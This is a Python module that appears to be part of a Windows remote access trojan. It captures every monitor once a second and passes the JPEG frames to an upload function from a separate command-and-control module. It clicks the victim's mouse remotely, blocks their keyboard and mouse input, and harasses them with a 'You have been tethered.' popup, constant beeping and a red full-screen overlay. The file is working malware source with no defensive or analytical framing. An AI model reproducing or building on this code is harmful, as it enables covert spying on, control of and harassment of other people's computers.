import tkinter as tk
from tkinter import messagebox
import threading
import time
import winsound
import ctypes # For Block Input
import pyautogui # For mouse/keyboard control
import mss # For screen capture
from io import BytesIO # To handle image data in memory
from PIL import Image

# --- Global variables ---
GUI_ROOT = None
OVERLAY_WINDOW = None
NOISE_ACTIVE = False
OVERLAY_ACTIVE = False
RAT_ACTIVE = False # New flag to control the RAT loop

# --- NEW: Function to be called from comms.py for uploading frames ---
RAT_UPLOAD_FUNC = None 

def init_gui(root):
    global GUI_ROOT
    GUI_ROOT = root

# --- NEW: RAT Core Logic ---
def _rat_loop():
    """The main loop for screen capturing and sending."""
    with mss.mss() as sct:
        while RAT_ACTIVE:
            try:
                # Capture the screen
                sct_img = sct.shot(output=None, mon=-1) # mon=-1 captures all monitors
                
                # Convert to PIL Image to compress as JPEG in memory
                img = Image.frombytes("RGB", (sct_img.width, sct_img.height), sct_img.rgb)
                buffer = BytesIO()
                img.save(buffer, format="JPEG", quality=75) # Start with 75% quality
                frame_data = buffer.getvalue()

                # Upload the frame using the function provided by comms.py
                if RAT_UPLOAD_FUNC:
                    RAT_UPLOAD_FUNC(frame_data)
                
                time.sleep(1) # Simple 1 FPS for now
            except Exception as e:
                print(f"[RAT ERROR] {e}")
                time.sleep(5)

def toggle_rat(upload_func):
    """Starts or stops the RAT thread."""
    global RAT_ACTIVE, RAT_UPLOAD_FUNC
    RAT_ACTIVE = not RAT_ACTIVE
    if RAT_ACTIVE:
        RAT_UPLOAD_FUNC = upload_func
        threading.Thread(target=_rat_loop, daemon=True).start()
    return f"RAT toggled {'ON' if RAT_ACTIVE else 'OFF'}"

def execute_mouse_click(x, y, button):
    """Moves the mouse and performs a click."""
    try:
        # pyautogui needs screen dimensions to work correctly
        screenWidth, screenHeight = pyautogui.size()
        # Scale the coordinates from the C2's view to the target's screen size
        target_x = int(screenWidth * x)
        target_y = int(screenHeight * y)
        pyautogui.click(x=target_x, y=target_y, button=button)
    except Exception as e:
        print(f"[MOUSE CLICK ERROR] {e}")

def block_user_input(duration_seconds=5):
    """Blocks mouse and keyboard input for a set duration."""
    # This requires the payload to be running as an Administrator
    try:
        ctypes.windll.user32.BlockInput(True)
        print(f"[*] Input blocked for {duration_seconds} seconds.")
        time.sleep(duration_seconds)
        ctypes.windll.user32.BlockInput(False)
        print("[*] Input unblocked.")
    except Exception as e:
        print(f"[BLOCK INPUT ERROR] {e}")

# --- Existing functions (unchanged) ---
def show_popup(text="You have been tethered."):
    if GUI_ROOT: GUI_ROOT.after(0, lambda: messagebox.showinfo("System Alert", text))
def _noise_loop():
    while NOISE_ACTIVE: winsound.Beep(500, 200); time.sleep(0.5)
def toggle_noise():
    global NOISE_ACTIVE; NOISE_ACTIVE = not NOISE_ACTIVE
    if NOISE_ACTIVE: threading.Thread(target=_noise_loop, daemon=True).start()
    return f"Noise toggled {'ON' if NOISE_ACTIVE else 'OFF'}"
def _create_overlay():
    global OVERLAY_WINDOW;
    if OVERLAY_WINDOW: OVERLAY_WINDOW.destroy()
    OVERLAY_WINDOW = tk.Toplevel(GUI_ROOT); OVERLAY_WINDOW.attributes('-fullscreen', True); OVERLAY_WINDOW.attributes('-alpha', 0.2);
    OVERLAY_WINDOW.attributes("-topmost", True); OVERLAY_WINDOW.configure(bg='red'); OVERLAY_WINDOW.overrideredirect(True)
def _destroy_overlay():
    global OVERLAY_WINDOW;
    if OVERLAY_WINDOW: OVERLAY_WINDOW.destroy(); OVERLAY_WINDOW = None
def toggle_screen_overlay():
    global OVERLAY_ACTIVE; OVERLAY_ACTIVE = not OVERLAY_ACTIVE
    if GUI_ROOT:
        if OVERLAY_ACTIVE: GUI_ROOT.after(0, _create_overlay)
        else: GUI_ROOT.after(0, _destroy_overlay)
    return f"Overlay toggled {'ON' if OVERLAY_ACTIVE else 'OFF'}"